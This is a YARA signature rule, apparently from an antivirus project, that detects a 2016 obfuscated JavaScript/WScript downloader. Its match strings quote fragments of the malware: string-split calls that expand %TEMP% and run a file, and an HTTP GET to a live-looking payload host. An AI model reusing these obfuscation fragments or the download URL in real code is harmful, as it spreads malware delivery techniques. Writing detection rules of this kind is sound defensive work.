rule sig_20160428_4c14f41dea181fceb1d02e466ab44ec6 {
  meta:
    description = "datamaliciousorder - file 20160428_4c14f41dea181fceb1d02e466ab44ec6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0ef552435469aebdbaba48ba91b1ecad21ee08e3538fa0c4edfb9e82519ecb2d"

  strings:
    $s1  = "function NdpFgcIgnLrhAltVxgOum() {return MijSbeXnyRsaMqqIyqLav[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function SjkXxoGgjBbrIquWwlVup(LwtVxiLolLkwGfuPycIqo){MijSbeXnyRsaMqqIyqLav[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function SjkXxoGgjBbrIquWwlVup(LwtVxiLolLkwGfuPycIqo){MijSbeXnyRsaMqqIyqLav[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function WzjTbyNdlUdtUteMesBsn(BreRryFvxWiuWbxTguMnr, UxqRtfIznIotTnnCqiJaj){ElfQryDqyHhrYrpDkqJml = ElfQryDqyHhrYrpDkqJml * 1; " ascii
    $s5  = "return BreRryFvxWiuWbxTguMnr - UxqRtfIznIotTnnCqiJaj;};" fullword ascii
    $s6  = "var MijSbeXnyRsaMqqIyqLav = function KycIycUlpBqvSbdCqhUik() {return SujKotDkkMuvPjoRbiDxt[WsrKzcWqmIyvHnoJxqVxz](\"WScript\"+\"" ascii
    $s7  = "BvpGxoIehDpxVjiUhhXla[DszQjiBnpRpyKzhWtcPri](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var MijSbeXnyRsaMqqIyqLav = function KycIycUlpBqvSbdCqhUik() {return SujKotDkkMuvPjoRbiDxt[WsrKzcWqmIyvHnoJxqVxz](\"WScript\"+\"" ascii
    $s9  = "var SujKotDkkMuvPjoRbiDxt = this[\"WScript\"];" fullword ascii
    $s10 = "function NdpFgcIgnLrhAltVxgOum() {return MijSbeXnyRsaMqqIyqLav[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function XadAyxRgcXsfInyXivYmw(){return BakGnvVttWdrKiyKxyEjs + \"\";};" fullword ascii
    $s12 = "if (BvpGxoIehDpxVjiUhhXla[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function WzjTbyNdlUdtUteMesBsn(BreRryFvxWiuWbxTguMnr, UxqRtfIznIotTnnCqiJaj){ElfQryDqyHhrYrpDkqJml = ElfQryDqyHhrYrpDkqJml * 1; " ascii
    $s14 = "function AllCwxRklBmsYjxBuhZrg() {return ((VemQohQyaTavCxqHdyXqo == true) && (VemQohQyaTavCxqHdyXqo == RnkJykDqvHsxPeyIgvBum)) ?" ascii
    $s15 = "function XyyLluNhtJquMqzGnbHfq(UuxBmwRhmSgaOywLxsIta) {var TubHxaPqcMdkHplYlnTxq = (1, 2, 3, 4, 5, UuxBmwRhmSgaOywLxsIta); retur" ascii
    $s16 = "function AllCwxRklBmsYjxBuhZrg() {return ((VemQohQyaTavCxqHdyXqo == true) && (VemQohQyaTavCxqHdyXqo == RnkJykDqvHsxPeyIgvBum)) ?" ascii
    $s17 = "function XyyLluNhtJquMqzGnbHfq(UuxBmwRhmSgaOywLxsIta) {var TubHxaPqcMdkHplYlnTxq = (1, 2, 3, 4, 5, UuxBmwRhmSgaOywLxsIta); retur" ascii
    $s18 = "function IdyKtnKmnUyqIshMeqZhz(){return WsrKzcWqmIyvHnoJxqVxz;};" fullword ascii
    $s19 = "var DeuTkeRuqPjtByvRjpGoy = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "var BexSnuZbeZhqOqcBjeAww = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}